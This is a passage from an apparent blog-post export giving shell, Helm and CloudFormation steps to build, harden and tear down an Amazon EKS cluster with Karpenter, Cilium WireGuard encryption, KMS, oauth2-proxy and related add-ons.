nginx_ingress_controller_requests{status=~\"4.+\"} ) / sum(nginx_ingress_controller_requests) ) &gt; 5 for: 1m labels: severity: warning annotations: description: Too many 4XXs summary: More than 5% of all requests returned 4XX, this requires your attention EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx.yml\" ingress-nginx ingress-nginx/ingress-nginx kubectl label namespace ingress-nginx pod-security.kubernetes.io/enforce=baseline forecastle Forecastle is a control panel that dynamically discovers and provides a launchpad for accessing applications deployed on Kubernetes. Install the forecastle Helm chart and modify its default values: # renovate: datasource=helm depName=forecastle registryUrl=https://stakater.github.io/stakater-charts FORECASTLE_HELM_CHART_VERSION=\"1.0.138\" helm repo add --force-update stakater https://stakater.github.io/stakater-charts tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" &lt;&lt; EOF forecastle: config: namespaceSelector: any: true title: Launch Pad networkPolicy: enabled: true ingress: enabled: true annotations: nginx.ingress.kubernetes.io/auth-signin: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/start?rd=\\$scheme://\\$host\\$request_uri nginx.ingress.kubernetes.io/auth-url: https://oauth2-proxy.${CLUSTER_FQDN}/oauth2/auth className: nginx hosts: - host: ${CLUSTER_FQDN} paths: - path: / pathType: Prefix tls: - hosts: - ${CLUSTER_FQDN} EOF helm upgrade --install --version \"${FORECASTLE_HELM_CHART_VERSION}\" --namespace forecastle --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-forecastle.yml\" forecastle stakater/forecastle kubectl label namespace forecastle pod-security.kubernetes.io/enforce=baseline oauth2-proxy Use OAuth2 Proxy to protect application endpoints with Google Authentication. Install the oauth2-proxy Helm chart and modify its default values: # renovate: datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"6.24.2\" helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: \"$(openssl rand -base64 32 | head -c 32 | base64)\" configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true className: nginx hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy kubectl label namespace oauth2-proxy pod-security.kubernetes.io/enforce=baseline Enforce Pod Security Standards with Namespace Labels Label all namespaces to provide warnings when configurations deviate from Pod Security Standards: kubectl label namespace --all pod-security.kubernetes.io/warn=baseline Details can be found in: Enforce Pod Security Standards with Namespace Labels Clean-up Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Remove any orphan EC2 instances created by Karpenter: for EC2 in $(aws ec2 describe-instances --filters \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" Name=instance-state-name,Values=running --query \"Reservations[].Instances[].InstanceId\" --output text); do echo \"Removing EC2: ${EC2}\" aws ec2 terminate-instances --instance-ids \"${EC2}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53-kms\" Wait for all CloudFormation stacks to complete deletion: aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove volumes and snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53-kms,eksctl-${CLUSTER_NAME},k8s-karpenter-provisioner,helm_values-{aws-ebs-csi-driver,aws-for-fluent-bit,cert-manager,external-dns,forecastle,ingress-nginx,karpenter,kube-prometheus-stack,mailpit,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy ‚Ä¶ üòâ" }, { "title": "Build secure Amazon EKS with Cilium and network encryption", "url": "/posts/cilium-amazon-eks/", "categories": "Kubernetes, Amazon EKS, Cilium, Security", "tags": "Amazon EKS, k8s, kubernetes, security, karpenter, eksctl, cert-manager, external-dns, podinfo, cilium, prometheus, sso, oauth2-proxy, metrics-server", "date": "2023-08-03 00:00:00 +0200", "content": "I will describe how to install Amazon EKS with Karpenter and Cilium, along with other standard applications. The Amazon EKS setup aims to meet the following cost-efficiency requirements: Use only two Availability Zones (AZs) to reduce payments for cross-AZ traffic Spot instances Less expensive region - us-east-1 Most price efficient EC2 instance type t4g.medium (2 x CPU, 4GB RAM) using AWS Graviton based on ARM Use Bottlerocket OS - small operation system / CPU / Memory footprint Use Network Load Balancer (NLB) as a most cost efficient + cost optimized load balancer Karpenter to autoscale with appropriately sized nodes matching pod requirements The Amazon EKS setup should also meet the following security requirements: The Amazon EKS control plane must be encrypted using KMS Worker node EBS volumes must be encrypted Cluster logging to CloudWatch must be configured Network Policies The Cilium installation aims to meet these requirements: Transparent network encryption for node-to-node traffic should be enabled Encryption should use WireGuard as it is considered a fast encryption method Use Elastic Network Interface (ENI) integration Layer 7 network observability should be enabled The Cilium Hubble UI should be protected by Single Sign-On (SSO) Build Amazon EKS cluster Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Verify that all necessary variables have been set: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_DEFAULT_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the necessary tools: You can skip these steps if you have all the required software already installed. AWS CLI eksctl kubectl cilium helm Configure AWS Route 53 Domain delegation The DNS delegation steps should only be done once. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Use your domain registrar to change the nameservers for your zone (e.g., mylabs.dev) to use Amazon Route 53 nameservers. You can find the required Route 53 nameservers as follows: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Create the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This step depends on your domain registrar; I use Cloudflare and automate this with Ansible: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create Route53 zone and KMS key Create a CloudFormation template that defines the Route53 zone and a KMS key. Add the new domain CLUSTER_FQDN to Route 53 and configure DNS delegation from the BASE_DOMAIN. tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries and KMS key Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live. Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN. (domain for all applications) Ex: k01.k8s.mylabs.dev\" Type: String ClusterName: Description: \"Cluster Name Ex: k01\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers KMSAlias: Type: AWS::KMS::Alias Properties: AliasName: !Sub \"alias/eks-${ClusterName}\" TargetKeyId: !Ref KMSKey KMSKey: Type: AWS::KMS::Key Properties: Description: !Sub \"KMS key for ${ClusterName} Amazon EKS\" EnableKeyRotation: true PendingWindowInDays: 7 KeyPolicy: Version: \"2012-10-17\" Id: !Sub \"eks-key-policy-${ClusterName}\" Statement: - Sid: Enable IAM User Permissions Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:root\" Action: kms:* Resource: \"*\" - Sid: Allow use of the key Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling\" # The following roles needs to be enabled after the EKS cluster is created # aws-ebs-csi-driver + Karpenter should be able to use the KMS key # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-irsa-aws-ebs-csi-driver\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-iamservice-role\" Action: - kms:Encrypt - kms:Decrypt - kms:ReEncrypt* - kms:GenerateDataKey* - kms:DescribeKey Resource: \"*\" - Sid: Allow attachment of persistent resources Effect: Allow Principal: AWS: - !Sub \"arn:aws:iam::${AWS::AccountId}:role/aws-service-role/autoscaling.amazonaws.com/AWSServiceRoleForAutoScaling\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-irsa-aws-ebs-csi-driver\" # - !Sub \"arn:aws:iam::${AWS::AccountId}:role/eksctl-${ClusterName}-iamservice-role\" Action: - kms:CreateGrant Resource: \"*\" Condition: Bool: kms:GrantIsForAWSResource: true Outputs: KMSKeyArn: Description: The ARN of the created KMS Key to encrypt EKS related services Value: !GetAtt KMSKey.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyArn\" KMSKeyId: Description: The ID of the created KMS Key to encrypt EKS related services Value: !Ref KMSKey Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyId\" EOF if [[ $(aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query \"StackSummaries[?starts_with(StackName, \\`${CLUSTER_NAME}-route53-kms\\`) == \\`true\\`].StackName\" --output text) == \"\" ]]; then # shellcheck disable=SC2001 eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"BaseDomain=${BASE_DOMAIN} ClusterFQDN=${CLUSTER_FQDN} ClusterName=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" --tags \"${TAGS//,/ }\" fi AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-route53-kms\" --query \"Stacks[0].Outputs[? OutputKey==\\`KMSKeyArn\\` || OutputKey==\\`KMSKeyId\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_KMS_KEY_ARN=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyArn\\\") .OutputValue\") AWS_KMS_KEY_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"KMSKeyId\\\") .OutputValue\") After running the CloudFormation stack, you should see the following Route53 zones: Route53 k01.k8s.mylabs.dev zone Route53 k8s.mylabs.dev zone You should also see the following KMS key: KMS key Create Amazon EKS I will use eksctl to create the Amazon EKS cluster. Create the Amazon EKS cluster using eksctl: tee \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" &lt;&lt; EOF apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} tags: karpenter.sh/discovery: ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") availabilityZones: - ${AWS_DEFAULT_REGION}a - ${AWS_DEFAULT_REGION}b iam: withOIDC: true serviceAccounts: - metadata: name: aws-for-fluent-bit namespace: aws-for-fluent-bit attachPolicyARNs: - arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy roleName: eksctl-${CLUSTER_NAME}-irsa-aws-for-fluent-bit - metadata: name: ebs-csi-controller-sa namespace: aws-ebs-csi-driver wellKnownPolicies: ebsCSIController: true roleName: eksctl-${CLUSTER_NAME}-irsa-aws-ebs-csi-driver - metadata: name: cert-manager namespace: cert-manager wellKnownPolicies: certManager: true roleName: eksctl-${CLUSTER_NAME}-irsa-cert-manager - metadata: name: cilium-operator namespace: cilium attachPolicyARNs: - arn:aws:iam::aws:policy/AmazonEKSWorkerNodePolicy - arn:aws:iam::aws:policy/AmazonEKS_CNI_Policy roleName: eksctl-${CLUSTER_NAME}-irsa-cilium roleOnly: true - metadata: name: external-dns namespace: external-dns wellKnownPolicies: externalDNS: true roleName: eksctl-${CLUSTER_NAME}-irsa-external-dns # Allow users which are consuming the AWS_ROLE_TO_ASSUME to access the EKS iamIdentityMappings: - arn: arn:aws:iam::${AWS_ACCOUNT_ID}:role/admin groups: - system:masters username: admin karpenter: # renovate: datasource=github-tags depName=aws/karpenter extractVersion=^(?&lt;version&gt;.*)$ version: v0.31.4 createServiceAccount: true withSpotInterruptionQueue: true addons: - name: kube-proxy - name: coredns managedNodeGroups: - name: mng01-ng amiFamily: Bottlerocket # Minimal instance type for running add-ons + karpenter - ARM t4g.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly # Minimal instance type for running add-ons + karpenter - X86 t3a.medium: 4.0 GiB, 2 vCPUs - 0.0336 hourly instanceType: t4g.medium # Due to karpenter we need 2 instances desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a minSize: 2 maxSize: 5 volumeSize: 20 disablePodIMDS: true volumeEncrypted: true volumeKmsKeyID: ${AWS_KMS_KEY_ID} taints: - key: \"node.cilium.io/agent-not-ready\" value: \"true\" effect: \"NoExecute\" maxPodsPerNode: 110 privateNetworking: true # Second node group is needed for karpenter to start (will be removed later) (Issue: https://github.com/eksctl-io/eksctl/issues/7003) - name: mng02-ng amiFamily: Bottlerocket instanceType: t4g.small desiredCapacity: 2 availabilityZones: - ${AWS_DEFAULT_REGION}a volumeSize: 5 volumeEncrypted: true volumeKmsKeyID: ${AWS_KMS_KEY_ID} spot: true privateNetworking: true secretsEncryption: keyARN: ${AWS_KMS_KEY_ARN} cloudWatch: clusterLogging: logRetentionInDays: 1 enableTypes: - all EOF Get the kubeconfig file to access the cluster: if [[ ! -s \"${KUBECONFIG}\" ]]; then if ! eksctl get clusters --name=\"${CLUSTER_NAME}\" &amp;&gt; /dev/null; then eksctl create cluster --config-file \"${TMP_DIR}/${CLUSTER_FQDN}/eksctl-${CLUSTER_NAME}.yml\" --kubeconfig \"${KUBECONFIG}\" # Add roles created by eksctl to the KMS policy to allow aws-ebs-csi-driver work with encrypted EBS volumes sed -i \"s@# \\(- \\!Sub \\\"arn:aws:iam::\\${AWS::AccountId}:role/eksctl-\\${ClusterName}.*\\)@\\1@\" \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" eval aws cloudformation update-stack \\ --parameters \"ParameterKey=BaseDomain,ParameterValue=${BASE_DOMAIN} ParameterKey=ClusterFQDN,ParameterValue=${CLUSTER_FQDN} ParameterKey=ClusterName,ParameterValue=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms\" --template-body \"file://${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms.yml\" else eksctl utils write-kubeconfig --cluster=\"${CLUSTER_NAME}\" --kubeconfig \"${KUBECONFIG}\" fi fi aws eks update-kubeconfig --name=\"${CLUSTER_NAME}\" The sed command used earlier modified the aws-cf-route53-kms.yml file by incorporating the newly established IAM roles (eksctl-k01-irsa-aws-ebs-csi-driver and eksctl-k01-iamservice-role), enabling them to utilize the KMS key. KMS key with new IAM roles Harden the Amazon EKS cluster and components Get the necessary details about the VPC, NACLs, and SGs: AWS_VPC_ID=$(aws ec2 describe-vpcs --filters \"Name=tag:alpha.eksctl.io/cluster-name,Values=${CLUSTER_NAME}\" --query 'Vpcs[*].VpcId' --output text) AWS_SECURITY_GROUP_ID=$(aws ec2 describe-security-groups --filters \"Name=vpc-id,Values=${AWS_VPC_ID}\" \"Name=group-name,Values=default\" --query 'SecurityGroups[*].GroupId' --output text) Fix a ‚Äúhigh‚Äù rated security issue ‚ÄúDefault security group should have no rules configured‚Äù: aws ec2 revoke-security-group-egress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --cidr 0.0.0.0/0 | jq || true aws ec2 revoke-security-group-ingress --group-id \"${AWS_SECURITY_GROUP_ID}\" --protocol all --port all --source-group \"${AWS_SECURITY_GROUP_ID}\" | jq || true Cilium Cilium is a networking, observability, and security solution featuring an eBPF-based dataplane. Endpoint ports: 4244 (peer-service) 9962 (metrics) 9963 (cilium-operator/metrics) 9964 (envoy-metrics), 9965 (hubble-metrics) Install Cilium and remove the mng02-ng nodegroup used for the ‚Äúeksctl karpenter‚Äù installation (it is no longer needed because Cilium will be installed and the taints will be removed): CILIUM_OPERATOR_SERVICE_ACCOUNT_ROLE_ARN=$(eksctl get iamserviceaccount --cluster \"${CLUSTER_NAME}\" --output json | jq -r \".[] | select(.metadata.name==\\\"cilium-operator\\\") .status.roleARN\") tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cilium.yml\" &lt;&lt; EOF cluster: name: ${CLUSTER_NAME} id: 0 serviceAccounts: operator: name: cilium-operator annotations: eks.amazonaws.com/role-arn: ${CILIUM_OPERATOR_SERVICE_ACCOUNT_ROLE_ARN} bandwidthManager: enabled: true egressMasqueradeInterfaces: eth0 encryption: enabled: true type: wireguard eni: enabled: true awsEnablePrefixDelegation: true awsReleaseExcessIPs: true eniTags: $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") iamRole: ${CILIUM_OPERATOR_SERVICE_ACCOUNT_ROLE_ARN} hubble: metrics: enabled: - dns - drop - tcp - flow - icmp - http relay: enabled: true ipam: mode: eni kubeProxyReplacement: disabled tunnel: disabled EOF # renovate: datasource=helm depName=cilium registryUrl=https://helm.cilium.io/ CILIUM_HELM_CHART_VERSION=\"1.14.0\" if ! kubectl get namespace cilium &amp;&gt; /dev/null; then kubectl create ns cilium cilium install --namespace cilium --version \"${CILIUM_HELM_CHART_VERSION}\" --wait --helm-values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-cilium.yml\" eksctl delete nodegroup mng02-ng --cluster \"${CLUSTER_NAME}\" --wait fi Karpenter Karpenter is a Kubernetes node autoscaler built for flexibility, performance, and simplicity. Configure Karpenter by applying the following provisioner definition: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-karpenter-provisioner.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: karpenter.sh/v1alpha5 kind: Provisioner metadata: name: default spec: consolidation: enabled: true startupTaints: - key: node.cilium.io/agent-not-ready value: \"true\" effect: NoExecute requirements: - key: karpenter.sh/capacity-type operator: In values: [\"spot\", \"on-demand\"] - key: kubernetes.io/arch operator: In values: [\"amd64\", \"arm64\"] - key: \"topology.kubernetes.io/zone\" operator: In values: [\"${AWS_DEFAULT_REGION}a\"] - key: karpenter.k8s.aws/instance-family operator: In values: [\"t3a\", \"t4g\"] kubeletConfiguration: maxPods: 110 # Resource limits constrain the total size of the cluster. # Limits prevent Karpenter from creating new instances once the limit is exceeded. limits: resources: cpu: 8 memory: 32Gi providerRef: name: default # Labels are arbitrary key-values that are applied to all nodes labels: managedBy: karpenter provisioner: default --- apiVersion: karpenter.k8s.aws/v1alpha1 kind: AWSNodeTemplate metadata: name: default spec: amiFamily: Bottlerocket subnetSelector: karpenter.sh/discovery: ${CLUSTER_NAME} securityGroupSelector: karpenter.sh/discovery: ${CLUSTER_NAME} blockDeviceMappings: - deviceName: /dev/xvda ebs: volumeSize: 2Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} - deviceName: /dev/xvdb ebs: volumeSize: 20Gi volumeType: gp3 encrypted: true kmsKeyID: ${AWS_KMS_KEY_ARN} tags: KarpenerProvisionerName: \"default\" Name: \"${CLUSTER_NAME}-karpenter\" $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") EOF aws-node-termination-handler The AWS Node Termination Handler gracefully handles EC2 instance shutdowns within Kubernetes. It is not needed when using EKS managed node groups, as discussed in Use with managed node groups. snapshot-controller Install the Volume Snapshot Custom Resource Definitions (CRDs): kubectl apply --kustomize 'https://github.com/kubernetes-csi/external-snapshotter//client/config/crd/?ref=v8.1.0' Install the volume snapshot controller snapshot-controller Helm chart and modify its default values: # renovate: datasource=helm depName=snapshot-controller registryUrl=https://piraeus.io/helm-charts/ SNAPSHOT_CONTROLLER_HELM_CHART_VERSION=\"2.2.0\" helm repo add --force-update piraeus-charts https://piraeus.io/helm-charts/ helm upgrade --wait --install --version \"${SNAPSHOT_CONTROLLER_HELM_CHART_VERSION}\" --namespace snapshot-controller --create-namespace snapshot-controller piraeus-charts/snapshot-controller aws-ebs-csi-driver The Amazon Elastic Block Store (Amazon EBS) Container Storage Interface (CSI) Driver provides a CSI interface used by Container Orchestrators to manage the lifecycle of Amazon EBS volumes. The ebs-csi-controller-sa ServiceAccount was created by eksctl. Install the Amazon EBS CSI Driver aws-ebs-csi-driver Helm chart and modify its default values: # renovate: datasource=helm depName=aws-ebs-csi-driver registryUrl=https://kubernetes-sigs.github.io/aws-ebs-csi-driver AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION=\"2.27.0\" helm repo add --force-update aws-ebs-csi-driver https://kubernetes-sigs.github.io/aws-ebs-csi-driver tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" &lt;&lt; EOF controller: enableMetrics: false serviceMonitor: forceEnable: true k8sTagClusterId: ${CLUSTER_NAME} extraVolumeTags: \"eks:cluster-name\": ${CLUSTER_NAME} $(echo \"${TAGS}\" | sed \"s/,/\\\\n /g; s/=/: /g\") serviceAccount: create: false name: ebs-csi-controller-sa region: ${AWS_DEFAULT_REGION} node: securityContext: # The node pod must be run as root to bind to the registration/driver sockets runAsNonRoot: false storageClasses: - name: gp3 annotations: storageclass.kubernetes.io/is-default-class: \"true\" parameters: encrypted: \"true\" kmskeyid: ${AWS_KMS_KEY_ARN} volumeSnapshotClasses: - name: ebs-vsc annotations: snapshot.storage.kubernetes.io/is-default-class: \"true\" deletionPolicy: Delete EOF helm upgrade --install --version \"${AWS_EBS_CSI_DRIVER_HELM_CHART_VERSION}\" --namespace aws-ebs-csi-driver --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-aws-ebs-csi-driver.yml\" aws-ebs-csi-driver aws-ebs-csi-driver/aws-ebs-csi-driver Delete the gp2 StorageClass, as gp3 will be used instead: kubectl delete storageclass gp2 || true Prometheus, DNS, Ingress, Certificates and others Many Kubernetes services and applications can export metrics to Prometheus. For this reason, Prometheus should be one of the first applications installed on a Kubernetes cluster. Then, you will need some basic tools and integrations, such as external-dns, ingress-nginx, cert-manager, oauth2-proxy, and others. mailhog MailHog will be used to receive email alerts from Prometheus. Install the mailhog Helm chart and modify its default values: # renovate: datasource=helm depName=mailhog registryUrl=https://codecentric.github.io/helm-charts 